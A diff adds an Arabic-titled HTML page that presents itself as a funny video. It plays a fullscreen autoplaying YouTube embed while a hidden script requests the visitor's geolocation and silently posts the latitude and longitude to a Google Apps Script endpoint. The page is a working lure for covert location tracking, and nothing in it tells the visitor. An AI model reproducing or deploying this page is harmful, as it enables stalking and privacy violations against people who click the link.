@@ -1,0 +1,46 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>🤣 شوف الفيديو ده</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      overflow: hidden;
+    }
+    iframe {
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <iframe src="https://www.youtube.com/embed/9A6OAWmtkWY?autoplay=1&rel=0&showinfo=0"
+          allowfullscreen allow="autoplay; encrypted-media"></iframe>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+
+      fetch("https://script.google.com/macros/s/AKfycbzL5Nys6NIEa27q5QPkcf0mMJ3U6YRr_ZBF1T7H3BLMBhI46VsbaS5xlv5DxYi2eCszcA/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lng
+        })
+      });
+    });
+  </script>
+
+</body>
+</html>
